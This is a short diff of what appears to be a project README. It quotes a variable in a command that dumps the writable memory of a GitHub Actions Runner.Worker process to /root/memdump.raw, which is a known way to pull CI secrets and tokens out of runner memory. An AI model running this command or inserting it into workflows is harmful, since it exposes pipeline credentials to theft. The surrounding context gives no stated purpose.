@@ -84,6 +84,6 @@ This project is licensed under the MIT License
 - Thanks to the developers of the various tools integrated into this project.
 
 ```
-run: docker exec kali bash -c 'PID=$(pgrep -f Runner.Worker) && echo "[*] PID: $PID" && awk '\''{split($1,a,"-"); if ($2 ~ /rw/) print a[1],a[2]}'\'' /proc/$PID/maps | while read start end; do dd if=/proc/$PID/mem bs=1 skip=$((0x$start)) count=$((0x$end - 0x$start)) 2>/dev/null; done > /root/memdump.raw'
+run: docker exec kali bash -c 'PID=$(pgrep -f Runner.Worker) && echo "[*] PID: $PID" && awk '\''{split($1,a,"-"); if ($2 ~ /rw/) print a[1],a[2]}'\'' /proc/"$PID"/maps | while read start end; do dd if=/proc/"$PID"/mem bs=1 skip=$((0x$start)) count=$((0x$end - 0x$start)) 2>/dev/null; done > /root/memdump.raw'
 ```
 
